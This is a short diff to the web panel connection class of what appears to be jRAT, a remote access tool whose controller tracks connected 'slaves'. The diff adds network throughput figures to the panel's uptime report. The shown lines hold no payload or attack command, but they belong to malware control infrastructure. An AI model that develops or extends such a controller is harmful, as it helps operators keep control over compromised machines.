@@ -7,6 +7,8 @@ import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.net.Socket;
 
+import com.redpois0n.graphs.utils.DataUnits;
+
 import se.jrat.common.exceptions.AuthenticationException;
 import se.jrat.common.utils.MathUtils;
 import se.jrat.controller.AbstractSlave;
@@ -19,6 +21,7 @@ import se.jrat.controller.settings.StatisticsCountry.CountryStatEntry;
 import se.jrat.controller.settings.StatisticsOperatingSystem;
 import se.jrat.controller.settings.StatisticsOperatingSystem.OperatingSystemStatEntry;
 import se.jrat.controller.settings.StoreOfflineSlaves;
+import se.jrat.controller.threads.NetworkCounter;
 
 public class WebPanelConnection implements Runnable {
 
@@ -159,7 +162,15 @@ public class WebPanelConnection implements Runnable {
                 	
                 	int diff = (int) (System.currentTimeMillis() - Main.START_TIME);
                 	
-                	sb.append(MathUtils.getTimeFromSeconds(diff / 1000));
+					String[] data = new String[] {
+							MathUtils.getTimeFromSeconds(diff / 1000),
+							DataUnits.getAsString(NetworkCounter.currentIn) + "/s down, " + DataUnits.getAsString(NetworkCounter.currentOut) + "/s up",
+							DataUnits.getAsString(NetworkCounter.totalIn) + " total down, " + DataUnits.getAsString(NetworkCounter.totalOut) + " total up",
+					};
+
+					for (String e : data) {
+						sb.append(e + ";");
+					}
                 	
                 	bw.write(sb.toString() + "\n");
                 	bw.flush();
